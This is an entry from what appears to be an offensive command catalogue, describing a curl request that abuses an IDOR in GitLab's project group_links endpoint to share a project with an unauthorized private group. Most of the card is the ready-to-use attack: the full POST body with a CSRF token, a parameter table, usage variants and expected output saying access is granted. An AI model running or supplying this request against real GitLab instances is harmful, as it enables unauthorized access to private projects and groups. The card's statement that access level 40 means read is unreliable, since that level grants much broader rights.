---
id: cmd-uuid-1
data: >-
  curl -X POST http://gitlab-instance/jane/dummy-project/group_links -d
  'utf8=%E2%9C%93&authenticity_token=LKWaV6ekT0zFbfFJPKRG78OyIsUvCxObht2Dn1l7p02SEa9IrefoAtdtwX%2F890lUqS2HLCtASPQyvFWmCYtJwA%3D%3D&link_group_id=7&link_group_access=40'
  -H 'Cookie: session=...'
tags:
  - idor
  - gitlab
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:28.189Z'
verified: false
validated: true
submitted: true
---
# gitlab-share-project-with-group

## Command

```bash
curl -X POST http://gitlab-instance/jane/dummy-project/group_links \
  -d 'utf8=%E2%9C%93&authenticity_token=LKWaV6ekT0zFbfFJPKRG78OyIsUvCxObht2Dn1l7p02SEa9IrefoAtdtwX%2F890lUqS2HLCtASPQyvFWmCYtJwA%3D%3D&link_group_id=7&link_group_access=40' \
  -H 'Cookie: session=...'
```

## Description

Shares a project with a specified group via GitLab's web endpoint, exploiting IDOR by setting link_group_id to an unauthorized private group.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `link_group_id` | ID of the target group (e.g., 7 for private) | Yes |
| `link_group_access` | Access level (40 for read) | Yes |
| `authenticity_token` | CSRF token from form | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://gitlab-instance/jane/dummy-project/group_links -d 'link_group_id=7&link_group_access=40' -H 'Cookie: ...'
```

### Advanced Usage

Include full form data as intercepted.

## Expected Output

HTTP 200/302 redirect; page updates to show shared group, granting access.

## Related

- [[commands/gitlab-api-share-project]]
